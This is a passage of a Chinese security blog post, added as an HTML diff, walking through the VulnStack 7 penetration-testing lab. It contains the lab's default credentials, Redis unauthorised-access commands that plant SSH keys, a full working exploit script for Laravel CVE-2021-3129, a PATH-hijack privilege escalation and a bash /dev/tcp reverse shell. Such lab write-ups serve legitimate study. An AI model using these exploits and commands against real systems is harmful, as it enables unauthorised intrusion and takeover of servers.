@@ -1,0 +1,999 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+  <!-- 元数据 -->
+  <meta charset="utf-8">
+  <link rel="icon" href="/images/favicon.ico">
+  
+  <title>VulnStack 7 | Err0r233</title>
+  <meta name="author" content="Err0r2333" />
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="robots" content="index,follow" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <meta name="format-detection" content="telphone=no, email=no" />
+  
+    <meta name="keywords" content="渗透" />
+  
+  <meta name="description" content="不想复习啊，打个vulnstack7放松一下就当我今天学习了吧">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VulnStack 7">
+<meta property="og:url" content="http://example.com/posts/58260.html">
+<meta property="og:site_name" content="Err0r233">
+<meta property="og:description" content="不想复习啊，打个vulnstack7放松一下就当我今天学习了吧">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/favicon.ico">
+<meta property="article:published_time" content="2024-12-05T12:31:12.000Z">
+<meta property="article:modified_time" content="2024-12-05T17:53:02.577Z">
+<meta property="article:author" content="Err0r2333">
+<meta property="article:tag" content="渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/favicon.ico">
+  
+  <!-- 站点验证相关 -->
+  
+    
+    
+    
+  
+  <!-- 样式表文件 -->
+  <link rel="stylesheet" id="kratos-css" href="/css/kratosr.min.css" media="all"></script>
+  
+    <link rel="stylesheet" id="darkmode-css" href="/css/kr-color-dark.min.css" media="(prefers-color-scheme: dark)"></script>
+    <script src="/js/kr-dark.min.js"></script>
+  
+  
+    <link rel="stylesheet" id="highlight-css" href="/css/highlight/night-eighties.min.css" media="all"></script>
+  
+  
+  <link rel="stylesheet" id="fontawe-css" href="/vendors/font-awesome@4.7.0/css/font-awesome.min.css" media="all"></script>
+  <link rel="stylesheet" id="nprogress-css" href="/vendors/nprogress@0.2.0/nprogress.css" media="all"></script>
+  
+  
+    <link rel="stylesheet" href="/vendors/aplayer@1.10.1/dist/APlayer.min.css"></script>
+  
+  
+    <link rel="stylesheet" href="/vendors/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css"></script>
+  
+  <!-- 不得不预先加载的一些JS文件 -->
+  <script src="/vendors/jquery@3.6.0/dist/jquery.min.js"></script>
+  
+    <script src="/vendors/qrcode_js@1.0.0/qrcode.min.js"></script>
+  
+  
+  <style>
+    
+      .kratos-cover.kratos-cover-2 {
+        background-image: url('/images/banner3.png');
+      }
+    
+    
+      @media(min-width:768px) {
+        body.custom-background {
+          background-image: url('/images/Iceartory.jpg');
+        }
+      }
+    
+  </style>
+  
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Err0r233" type="application/atom+xml">
+</head>
+
+
+
+    <body class="custom-background">
+        <div id="kratos-wrapper">
+    <div id="kratos-page">
+        <div id="kratos-header">
+            <header id="kratos-desktop-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="nav-header">
+                        <nav id="kratos-menu-wrap">
+                            <ul id="kratos-primary-menu" class="sf-menu">
+                                
+                                    
+                                    
+                                        
+                                            <li><a href="/"><i class="fa fa-home"></i>首页</a></li>
+                                        
+                                    
+                                        
+                                            <li><a href="/archives/"><i class="fa fa-file"></i>档案馆</a></li>
+                                        
+                                    
+                                        
+                                            <li><a href="/friends/"><i class="fa fa-paw"></i>好伙伴</a></li>
+                                        
+                                    
+                                        
+                                            <li>
+                                                <a><i class="fa fa-link"></i>链接</a>
+                                                <ul class="sub-menu">
+                                                    
+                                                        
+                                                    
+                                                </ul>
+                                            </li>
+                                        
+                                    
+                                
+                            </ul>
+                        </nav>
+                    </div>
+                </div>
+            </header>
+            <header id="kratos-mobile-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="color-logo"><a href="/">Err0r233</a></div>
+                    <div class="nav-toggle">
+                        <a class="kratos-nav-toggle js-kratos-nav-toggle">
+                            <i></i>
+                        </a>
+                    </div>
+                </div>
+            </header>
+        </div>
+        <div class="kratos-start kratos-hero-2">
+            <!-- <div class="kratos-overlay"></div> -->
+            <div class="kratos-cover kratos-cover-2 text-center">
+                <div class="desc desc2 animate-box">
+                    <a href="/">
+                        <h2>Err0r233</h2> <br />
+                        <span>Err0r233的个人博客</span>
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <div id="kratos-blog-post">
+            <div class="container">
+                <div id="main" class="row">
+                    
+
+        
+
+        
+
+            <section class="col-md-8">
+
+        
+
+            <article itemscope itemtype="https://schema.org/Article">
+    
+    <link itemprop="mainEntityOfPage" href="http://example.com/posts/58260.html">
+    <div class="kratos-hentry kratos-post-inner clearfix">
+        <header class="kratos-entry-header">
+            
+                <h1 class="kratos-entry-title text-center" itemprop="name headline">VulnStack 7</h1>
+            
+            
+            <ul class="kratos-post-meta text-center">
+                <li><time datetime="2024-12-05T12:31:12.000Z" itemprop="datePublished"><i class="fa fa-calendar"></i> 2024-12-05</time></li>
+                <li itemprop="author" itemscope itemtype="https://schema.org/Person">
+                    <i class="fa fa-user"></i> 作者 <span itemprop="name">Err0r2333</span>
+                </li>
+                <li>
+                    <i class="fa fa-edit"></i> 
+                    
+                    
+                        ~40.78K
+                    
+                    字
+                </li>
+                
+                    <li id="/posts/58260.html" class="leancloud_visitors" data-flag-title="VulnStack 7">
+                        <i class="fa fa-eye"></i>
+                        <span class="leancloud-visitors-count"> </span> 次阅读
+                    </li>
+                    
+                
+            </ul>
+        </header>
+        <div class="kratos-post-content">
+            
+            <div id="expire-alert" class="alert alert-warning hidden" role="alert">
+                <div class="icon"><i class="fa fa-warning"></i></div>
+                <div class="text"><p>本文最后编辑于 <time datetime="1733421182577"></time> 前，其中的内容可能需要更新。</p></div>
+            </div>
+            
+            
+            
+            <hr />
+            <div itemprop="articleBody"><p>不想复习啊，打个vulnstack7放松一下就当我今天学习了吧</p>
+<span id="more"></span>
+<p><a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1qavABmu8E75Q4y6os-Joqw?pwd=ci20">download</a></p>
+<h1><span id="环境配置"> 环境配置</span></h1>
+<p>整个靶场环境一共五个靶机（总共27.8 GB），分别位于三层网络环境中(来自官方文档)：</p>
+<img src="/posts/undefined/1.png" class title="awa">
+<p>虚拟机搭搭，在Vmware中新增两个虚拟网卡<code>VMnet8</code>、<code>VMnet14</code>。<code>VMnet8</code>设为默认的NAT模式，IP段设为 <code>192.168.52.0/24</code>；<code>VMnet14</code>设为仅主机模式，IP段设为<code>192.168.93.0/24</code>，如下图所示</p>
+<img src="/posts/undefined/2.png" class title="awa">
+<p>实测由于NAT模式和52网段是一致的，因此我修改了一下，访问<code>192.168.54.128</code>就是web1的公网了</p>
+<p>配网卡如下：</p>
+<ul>
+<li>为Web 1配置两张网卡，一张桥接模式（或者nat主机），另一张连<code>VMnet8</code></li>
+<li>为Web 2和PC1配置两张网卡，一张<code>VMnet8</code>、另一张<code>VMnet14</code></li>
+<li>为DC和PC 2配置一张网卡，为<code>VMnet14</code></li>
+</ul>
+<p>由于所有靶机都是没有启动服务的，我们需要手动配置一下：</p>
+<h2><span id="域用户信息"> 域用户信息</span></h2>
+<p>域用户账户和密码如下：</p>
+<ul>
+<li>
+<p>Administrator：Whoami2021</p>
+</li>
+<li>
+<p>whoami：Whoami2021</p>
+</li>
+<li>
+<p>bunny：Bunny2021</p>
+</li>
+<li>
+<p>moretz：Moretz2021</p>
+</li>
+<li>
+<p>Ubuntu 1：</p>
+<ul>
+<li>web：web2021</li>
+</ul>
+</li>
+<li>
+<p>Ubuntu 2：</p>
+</li>
+<li>
+<p>ubuntu：ubuntu</p>
+</li>
+<li>
+<p>通达OA账户：</p>
+<ul>
+<li>admin：admin657260</li>
+</ul>
+</li>
+</ul>
+<p>手动登录各台机子后打开服务：</p>
+<p>Web 1：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">redis-server /etc/redis.conf</span><br><span class="line">/usr/sbin/nginx -c /etc/nginx/nginx.conf</span><br><span class="line">iptables -F</span><br></pre></td></tr></table></figure>
+<p>Web 2:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo service docker start</span><br><span class="line">sudo docker start 8e172820ac78</span><br></pre></td></tr></table></figure>
+<p>PC 1:</p>
+<p>启动通达OA：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\MYOA\bin\AutoConfig.exe</span><br><span class="line"></span><br><span class="line">注意此处需要关闭防火墙+管理员权限运行</span><br></pre></td></tr></table></figure>
+<p>配置完毕后开打。</p>
+<h1><span id="开打"> 开打</span></h1>
+<p>fscan扫<code>192.168.54.128</code>：</p>
+<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">.\fscan.exe</span> <span class="string">-h 192.168.54.128</span></span><br><span class="line"></span><br><span class="line">   <span class="attr">___</span>                              <span class="string">_    </span></span><br><span class="line">  <span class="attr">/</span> <span class="string">_ \     ___  ___ _ __ __ _  ___| | __ </span></span><br><span class="line"> <span class="attr">/</span> <span class="string">/_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span></span><br><span class="line"><span class="attr">/</span> <span class="string">/_\\_____\__ \ (__| | | (_| | (__|   &lt;</span></span><br><span class="line"><span class="attr">\____/</span>     <span class="string">|___/\___|_|  \__,_|\___|_|\_\</span></span><br><span class="line"><span class="string">                     fscan version: 1.8.4</span></span><br><span class="line"><span class="attr">[*]</span> <span class="string">start port scan</span></span><br><span class="line"> <span class="attr">192.168.54.128</span>: <span class="string">[22 80 81 6379]</span></span><br><span class="line"><span class="attr">[*]</span> <span class="string">alive ports len is :4</span></span><br><span class="line"><span class="attr">---------------------------------------------</span></span><br><span class="line"><span class="attr">[*]</span> <span class="string">start vulscan</span></span><br><span class="line"><span class="attr">[*]</span> <span class="string">WebTitle http://192.168.54.128:81  code:200 len:17474  title:Laravel</span></span><br><span class="line"><span class="attr">[+]</span> <span class="string">InfoScan http://192.168.54.128:81  [Laravel] </span></span><br><span class="line"><span class="attr">[*]</span> <span class="string">WebTitle http://192.168.54.128     code:502 len:584    title:502 Bad Gateway</span></span><br><span class="line"><span class="attr">[+]</span> <span class="string">Redis 192.168.54.128:6379 unauthorized file:/home/web/dump.rdb</span></span><br><span class="line"><span class="attr">[+]</span> <span class="string">Redis 192.168.54.128:6379 like can write /var/spool/cron/</span></span><br><span class="line"><span class="attr">[+]</span> <span class="string">PocScan http://192.168.54.128:81 poc-yaml-laravel-cve-2021-3129</span></span><br></pre></td></tr></table></figure>
+<p>可以看见开的81、6379都是有漏洞的。</p>
+<p>想起laravel的cve可以去看一下今年鹏城杯线上赛的一个<code>ez_laravel</code>，被折磨的不清，不过这里是cve，我到时候再直接找python脚本跑，这里先利用redis未授权访问</p>
+<p>流程：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir /root/.ssh/</span><br><span class="line">config set dbfilename authorized_keys</span><br><span class="line">set x &quot;\n\n\n 你的公钥&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+<p>但是permission denied：</p>
+<img src="/posts/undefined/3.png" class title="awa">
+<p>原因是忘记sudo起root权限的redis了，修改后重新写入：</p>
+<img src="/posts/undefined/4.png" class title="awa">
+<p>随后<code>ssh root@192.168.54.128</code>免密登录成功</p>
+<img src="/posts/undefined/5.png" class title="awa">
+<p>拿到root权限后通过<code>ifconfig</code>发现52网段，传fscan对52网段进行扫描：</p>
+<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">root@ubuntu</span>:<span class="string">~# ./fscan -h 192.168.52.1-255</span></span><br><span class="line"></span><br><span class="line">   <span class="attr">___</span>                              <span class="string">_    </span></span><br><span class="line">  <span class="attr">/</span> <span class="string">_ \     ___  ___ _ __ __ _  ___| | __ </span></span><br><span class="line"> <span class="attr">/</span> <span class="string">/_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span></span><br><span class="line"><span class="attr">/</span> <span class="string">/_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span></span><br><span class="line"><span class="attr">\____/</span>     <span class="string">|___/\___|_|  \__,_|\___|_|\_\   </span></span><br><span class="line">                     <span class="attr">fscan</span> <span class="string">version: 1.8.3</span></span><br><span class="line"><span class="attr">start</span> <span class="string">infoscan</span></span><br><span class="line"><span class="attr">(icmp)</span> <span class="string">Target 192.168.52.10   is alive</span></span><br><span class="line"><span class="attr">(icmp)</span> <span class="string">Target 192.168.52.20   is alive</span></span><br><span class="line"><span class="attr">[*]</span> <span class="string">Icmp alive hosts len is: 2</span></span><br><span class="line"><span class="attr">192.168.52.20</span>:<span class="string">22 open</span></span><br><span class="line"><span class="attr">192.168.52.10</span>:<span class="string">22 open</span></span><br><span class="line"><span class="attr">192.168.52.10</span>:<span class="string">81 open</span></span><br><span class="line"><span class="attr">192.168.52.10</span>:<span class="string">80 open</span></span><br><span class="line"><span class="attr">192.168.52.10</span>:<span class="string">6379 open</span></span><br><span class="line"><span class="attr">192.168.52.20</span>:<span class="string">8000 open</span></span><br><span class="line"><span class="attr">[*]</span> <span class="string">alive ports len is: 6</span></span><br><span class="line"><span class="attr">start</span> <span class="string">vulscan</span></span><br><span class="line"><span class="attr">[*]</span> <span class="string">WebTitle http://192.168.52.20:8000 code:200 len:17474  title:Laravel</span></span><br><span class="line"><span class="attr">[*]</span> <span class="string">WebTitle http://192.168.52.10:81   code:200 len:17474  title:Laravel</span></span><br><span class="line"><span class="attr">[+]</span> <span class="string">InfoScan http://192.168.52.20:8000 [Laravel] </span></span><br><span class="line"><span class="attr">[+]</span> <span class="string">InfoScan http://192.168.52.10:81   [Laravel]                             </span></span><br><span class="line"><span class="attr">[*]</span> <span class="string">WebTitle http://192.168.52.10      code:502 len:584    title:502 Bad Gateway</span></span><br><span class="line"><span class="attr">[+]</span> <span class="string">Redis 192.168.52.10:6379 unauthorized file:/root/.ssh/authorized_keys</span></span><br><span class="line"><span class="attr">[+]</span> <span class="string">Redis 192.168.52.10:6379 like can write /root/.ssh/                      </span></span><br><span class="line"><span class="attr">[+]</span> <span class="string">Redis 192.168.52.10:6379 like can write /var/spool/cron/                 </span></span><br><span class="line"><span class="attr">[+]</span> <span class="string">PocScan http://192.168.52.10:81 poc-yaml-laravel-cve-2021-3129           </span></span><br><span class="line"><span class="attr">[+]</span> <span class="string">PocScan http://192.168.52.20:8000 poc-yaml-laravel-cve-2021-3129</span></span><br></pre></td></tr></table></figure>
+<p>发现<code>192.168.52.20</code>(10是本机)</p>
+<p>20段发现还是<code>laravel</code>服务？</p>
+<p>查看nginx服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /etc/nginx/conf.d</span><br></pre></td></tr></table></figure>
+<p>可以看到确实有81端口的反代，因此我们实际访问81的端口是<code>192.168.52.20</code>的8000端口，于是直接打即可。</p>
+<p>但是我们先frp打通52网段，走<code>192.168.54.129</code>的6002端口起socks5即可：</p>
+<img src="/posts/undefined/7.png" class title="awa">
+<p>走socks5代理成功访问到52网段</p>
+<img src="/posts/undefined/8.png" class title="awa">
+<p>搜<code>cve-2021-3129</code>的payload：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/crisprss/Laravel_CVE-2021-3129_EXP/tree/main">https://github.com/crisprss/Laravel_CVE-2021-3129_EXP/tree/main</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding=utf-8 -*-</span></span><br><span class="line"><span class="comment"># Author : Crispr</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">EXP</span>:</span><br><span class="line">    <span class="comment">#这里还可以增加phpggc的使用链，经过测试发现RCE5可以使用</span></span><br><span class="line">    __gadget_chains = &#123;</span><br><span class="line">        <span class="string">&quot;monolog_rce5&quot;</span>:<span class="string">r&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">         php -d &quot;phar.readonly=0&quot; ./phpggc Laravel/RCE5 &quot;%s&quot; --phar phar -o php://output | base64 -w 0 | python -c &quot;import sys;print(&#x27;&#x27;.join([&#x27;=&#x27; + hex (ord(i))[2:] + &#x27;=00&#x27; for i in sys.stdin.read()]).upper())&quot;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__vul_check</span>(<span class="params">self</span>):</span><br><span class="line">        res = requests.get(self.__url,verify=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> res.status_code != <span class="number">405</span> <span class="keyword">and</span> <span class="string">&quot;laravel&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+]Vulnerability does not exist&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__payload_send</span>(<span class="params">self,payload</span>):</span><br><span class="line">        header = &#123;</span><br><span class="line">            <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;application/json&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;solution&quot;</span>: <span class="string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span>,</span><br><span class="line">            <span class="string">&quot;parameters&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;variableName&quot;</span>: <span class="string">&quot;cve20213129&quot;</span>,</span><br><span class="line">                <span class="string">&quot;viewFile&quot;</span>: <span class="string">&quot;&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        data[<span class="string">&quot;parameters&quot;</span>][<span class="string">&quot;viewFile&quot;</span>] = payload</span><br><span class="line">        res = requests.post(self.__url, headers=header, json=data, verify=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__clear_log</span>(<span class="params">self</span>):</span><br><span class="line">        payload = <span class="string">&quot;php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot;</span></span><br><span class="line">        <span class="keyword">return</span> self.__payload_send(payload=payload)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__generate_payload</span>(<span class="params">self,gadget_chain</span>):</span><br><span class="line">        generate_exp = self.__gadget_chains[gadget_chain] % self.__command</span><br><span class="line">        <span class="comment">#print(generate_exp)</span></span><br><span class="line">        exp = <span class="string">&quot;&quot;</span>.join(os.popen(generate_exp).readlines()).replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>)+ <span class="string">&#x27;a&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+]exploit:&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(exp)</span><br><span class="line">        <span class="keyword">return</span> exp</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__decode_log</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.__payload_send(</span><br><span class="line">            <span class="string">&quot;php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__unserialize_log</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.__payload_send(<span class="string">&quot;phar://../storage/logs/laravel.log/test.txt&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__rce</span>(<span class="params">self</span>):</span><br><span class="line">        text = <span class="built_in">str</span>(self.__unserialize_log().text)</span><br><span class="line">        <span class="comment">#print(text)</span></span><br><span class="line">        text = text[text.index(<span class="string">&#x27;]&#x27;</span>):].replace(<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;]&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> text</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">exp</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">for</span> gadget_chain <span class="keyword">in</span> self.__gadget_chains.keys():</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*] Try to use %s for exploitation.&quot;</span> % (gadget_chain))</span><br><span class="line">            self.__clear_log()</span><br><span class="line">            self.__clear_log()</span><br><span class="line">            self.__payload_send(<span class="string">&#x27;A&#x27;</span> * <span class="number">2</span>)</span><br><span class="line">            self.__payload_send(self.__generate_payload((gadget_chain)))</span><br><span class="line">            self.__decode_log()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*] Result:&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(self.__rce())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, target, command</span>):</span><br><span class="line">        self.target = target</span><br><span class="line">        self.__url = requests.compat.urljoin(target, <span class="string">&quot;_ignition/execute-solution&quot;</span>)</span><br><span class="line">        self.__command = command</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.__vul_check():</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] [%s] is seems not vulnerable.&quot;</span> % (self.target))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*] You can also call obj.exp() to force an attack.&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.exp()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    EXP(<span class="string">&quot;http://127.0.0.1:8000&quot;</span>,sys.argv[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<img src="/posts/undefined/9.png" class title="awa">
+<p>都拿下了，如果可以也可以配置proxychains4来打20机，但是会很慢。但是它做了一层反代出去之后我们就可以通过81端口拿下20机laravel服务</p>
+<img src="/posts/undefined/10.png" class title="awa">
+<p>我们再写个shell进去：</p>
+<img src="/posts/undefined/11.png" class title="awa">
+<p>蚁剑连接</p>
+<img src="/posts/undefined/12.png" class title="awa">
+<p>成功拿下，继续查看信息(此时我们其实是对内网的52.20机子进行操作)，发现无法进行ipconfig操作。</p>
+<p><code>ls -al /</code>发现了<code>.dockerenv</code>文件，说明我们是在一个docker环境里。尝试docker逃逸，但前提是docker逃逸需要root权限，我们得找办法提权：</p>
+<img src="/posts/undefined/13.png" class title="awa">
+<p>发现有<code>/home/jobs/shell</code>文件在，查看还能够得到demo.c：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(www-data:/home/jobs) $ cat demo.c</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include&lt;unistd.h&gt;</span></span><br><span class="line">void main()</span><br><span class="line">&#123; setuid(0);</span><br><span class="line">  setgid(0);</span><br><span class="line">  system(&quot;ps&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里可以看到是一个执行ps的操作，但是执行的时候是root权限执行的。</p>
+<p>利用就参照一下自己的博客：<a target="_blank" rel="noopener" href="https://err0r233.github.io/posts/13343.html">https://err0r233.github.io/posts/13343.html</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;/bin/bash&quot; &gt; /tmp/ls</span><br><span class="line">chmod 777 /tmp/ls</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line"></span><br><span class="line">#然后执行这个test可执行文件</span><br></pre></td></tr></table></figure>
+<p>这里的例子是ls，所以我们改成ps即可：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;/bin/bash&quot; &gt; /tmp/ps</span><br><span class="line">chmod 777 /tmp/ps</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line"></span><br><span class="line">#然后执行这个test可执行文件</span><br></pre></td></tr></table></figure>
+<p>注意我们现在的环境变量是php的环境变量，想修改环境变量得反弹一个shell过来：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#x27;exec bash -i &gt;&amp; /dev/tcp/192.168.52.10/1337 0&gt;&amp;1&#x27;</span><br><span class="line"></span><br><span class="line"># 这里也是学到了用蚁剑的终端怎么反弹shell了</span><br></pre></td></tr></table></figure>
+<p>为什么要用52.10这台ubuntu机子呢，因为他其实是<code>52.20</code>，它只通web1</p>
+<p>由此可以从web1拿下。然后执行shell：</p>
+<img src="/posts/undefined/14.png" class title="awa">
+<p>环境没有python3，就将就一下用这个shell吧。</p>
+<p>接下来看是否为特权模式：</p>
